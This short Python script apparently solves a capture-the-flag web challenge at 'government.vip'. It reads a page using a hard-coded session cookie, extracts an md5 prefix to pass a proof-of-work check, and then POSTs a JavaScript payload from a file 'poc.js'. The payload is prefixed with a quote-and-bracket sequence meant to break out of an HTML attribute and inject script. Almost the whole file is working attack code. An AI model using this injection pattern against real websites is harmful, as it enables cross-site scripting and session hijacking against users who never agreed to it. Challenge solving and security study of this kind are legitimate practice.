from md5_search import solution
import requests, re, time
import IPython

cookies = {"PHPSESSID":  "ij2ulcbklf9o6phdacq5ilrf47"}
def grab_substr():
	base_url = "http://government.vip/"
	r = requests.get(base_url, cookies = cookies)

	response = r.text
	res = re.search(r"=== '([0-9a-f]+)'\).",response)

	# print response
	return res.group(1)

def fire_and_go(task):
	poc_js = open("poc.js","rb")
	payload = poc_js.read()
	poc_js.close()

	post_url = "http://government.vip/run.php"
	data = {"task" : task, "payload" : "\.\">" + payload}

	r_p = requests.post(post_url, cookies = cookies, data = data)
	print r_p.text

if __name__ == '__main__':
	s = grab_substr()
	task = solution(s)

	fire_and_go(task)
